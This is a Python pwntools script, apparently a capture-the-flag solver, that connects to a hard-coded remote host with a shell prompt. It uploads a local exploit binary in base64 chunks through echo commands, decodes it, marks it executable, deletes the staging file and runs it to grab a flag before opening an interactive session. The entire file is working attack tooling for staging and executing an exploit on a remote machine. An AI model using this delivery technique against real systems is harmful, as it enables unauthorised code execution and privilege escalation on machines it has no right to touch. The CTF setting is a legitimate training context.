#!/usr/bin/env python3
from pwn import *
import base64, time

context.log_level = 'info'

HOST = '154.57.164.76'
PORT = 30527

def recv_prompt(r, timeout=15):
    try:
        return r.recvuntil(b'/ $', timeout=timeout)
    except:
        return b''

def main():
    r = remote(HOST, PORT)

    data = recv_prompt(r, timeout=50)
    if not data:
        log.error("No shell prompt found")
        return
    log.info("Got shell, uploading exploit to /home/user/...")

    with open('/tmp/rfs2/exploit', 'rb') as f:
        xbin = f.read()
    b64 = base64.b64encode(xbin).decode()
    chunk_size = 380
    total = (len(b64) + chunk_size - 1) // chunk_size
    for i in range(0, len(b64), chunk_size):
        chunk = b64[i:i+chunk_size]
        r.sendline(f"echo '{chunk}' >> /home/user/e.b64".encode())
        recv_prompt(r, timeout=30)
        log.info(f"Chunk {i//chunk_size + 1}/{total}")

    log.info("Decoding and running...")
    r.sendline(b"cat /home/user/e.b64 | base64 -d > /home/user/exp 2>&1; echo done=$?")
    recv_prompt(r, timeout=15)
    r.sendline(b'chmod +x /home/user/exp')
    recv_prompt(r, timeout=15)
    r.sendline(b'rm /home/user/e.b64')
    recv_prompt(r, timeout=15)
    r.sendline(b'/home/user/exp')

    try:
        out = r.recvuntil(b'}', timeout=300)
        log.success(f"Flag: {out.decode(errors='replace')}")
    except:
        log.warning("Timeout, reading remaining output...")
        try:
            out = r.recv(timeout=10)
            log.info(f"Output: {out.decode(errors='replace')}")
        except:
            log.warning("No more output")

    r.interactive()

if __name__ == '__main__':
    main()
